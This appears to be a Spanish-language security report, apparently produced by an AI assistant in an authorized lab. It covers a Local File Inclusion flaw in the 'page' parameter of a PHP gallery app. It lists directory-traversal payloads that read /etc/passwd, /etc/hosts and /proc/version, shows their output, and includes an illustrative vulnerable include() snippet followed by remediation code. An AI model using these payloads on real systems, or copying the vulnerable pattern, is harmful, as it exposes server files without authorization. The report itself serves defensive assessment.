# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30  
**Hora:** 16:09:20 UTC  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## Resumen Ejecutivo

Se ha identificado y explotado una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor sin autenticación.

**Resultado:** ⚠️ VULNERABILIDAD CRÍTICA ENCONTRADA Y EXPLOTADA

---

## Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP
- **URL principal:** http://web.dev.local:8081/
- **Páginas identificadas:** `index.php`, `gallery.php`

---

## Vulnerabilidad Identificada

### LFI en parámetro `page` de `gallery.php`

| Campo | Detalle |
|---|---|
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php?page=` |
| **Parámetro** | `page` (GET) |
| **Tipo** | Local File Inclusion (LFI) |
| **Severidad** | Crítica |
| **CVSS estimado** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **Autenticación requerida** | No |

### Descripción Técnica

La aplicación incluye dinámicamente archivos PHP según el valor del parámetro `page` de la URL, sin aplicar ningún tipo de validación ni sanitización. Esto permite a un atacante utilizar secuencias de traversal de directorios (`../`) para acceder a archivos fuera del directorio web raíz.

**Ejemplo de payload utilizado:**
```
GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

---

## Evidencias de Explotación

### 1. Lectura de `/etc/passwd`

**Payload:** `../../../../etc/passwd`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd`

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 2. Lectura de `/etc/hosts`

**Payload:** `../../../../etc/hosts`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../../etc/hosts`

**Resultado:**
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.19.0.2	d5054e367753
```

**Información relevante:** El servidor tiene IP `172.19.0.2` y hostname `d5054e367753`, lo que indica que se ejecuta en un contenedor Docker.

### 3. Lectura de `/proc/version`

**Payload:** `../../../../proc/version`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../../proc/version`

**Resultado:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

**Información relevante:** El servidor ejecuta Ubuntu con kernel Linux 6.8.0-110-generic.

---

## Impacto

| Categoría | Impacto |
|---|---|
| **Confidencialidad** | Alto - Lectura de archivos sensibles del sistema |
| **Integridad** | Nulo - Solo lectura |
| **Disponibilidad** | Nulo |

### Archivos potencialmente expuestos

- `/etc/passwd` - Lista de usuarios del sistema ✅ (confirmado)
- `/etc/shadow` - Hashes de contraseñas (si permisos lo permiten)
- `/etc/hosts` - Configuración de red ✅ (confirmado)
- `/proc/version` - Versión del kernel ✅ (confirmado)
- Código fuente PHP de la aplicación
- Archivos de configuración con credenciales de base de datos
- Claves SSH privadas en directorios de usuario
- Logs del sistema y del servidor web

---

## Causa Raíz

La vulnerabilidad se origina por el uso inseguro de inclusión dinámica de archivos en PHP sin validación del input del usuario. El código vulnerable sigue este patrón:

```php
// CÓDIGO VULNERABLE (ejemplo ilustrativo)
$page = $_GET['page'];
include($page . '.php');
// O bien sin extensión:
include($page);
```

---

## Recomendaciones de Remediación

### 1. Validación estricta de entrada (Inmediato)
Implementar una lista blanca de páginas permitidas:
```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';
if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // Página por defecto
}
include('pages/' . $page . '.php');
```

### 2. Usar rutas absolutas con `realpath()`
```php
$base_dir = realpath('/var/www/html/pages/');
$page = realpath($base_dir . '/' . $page . '.php');
if ($page === false || strpos($page, $base_dir) !== 0) {
    die('Página no válida');
}
include($page);
```

### 3. Configuración PHP (php.ini)
```ini
; Deshabilitar la inclusión de URLs remotas
allow_url_include = Off
allow_url_fopen = Off
; Limitar el directorio de trabajo
open_basedir = /var/www/html/
```

### 4. Principio de mínimo privilegio
- Ejecutar el servidor web con usuario con mínimos privilegios
- Restringir permisos de lectura en archivos sensibles del sistema

---

## Conclusiones

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad crítica de Local File Inclusion en el parámetro `page` del archivo `gallery.php`. Esta vulnerabilidad fue explotada con éxito, permitiendo la lectura de archivos sensibles del sistema como `/etc/passwd`, `/etc/hosts` y `/proc/version`.

La ausencia total de validación en el parámetro de entrada convierte esta vulnerabilidad en trivialmente explotable por cualquier atacante sin necesidad de autenticación. Se recomienda aplicar las medidas de remediación indicadas de forma inmediata.

---

*Informe generado automáticamente por análisis de seguridad - Laboratorio autorizado*
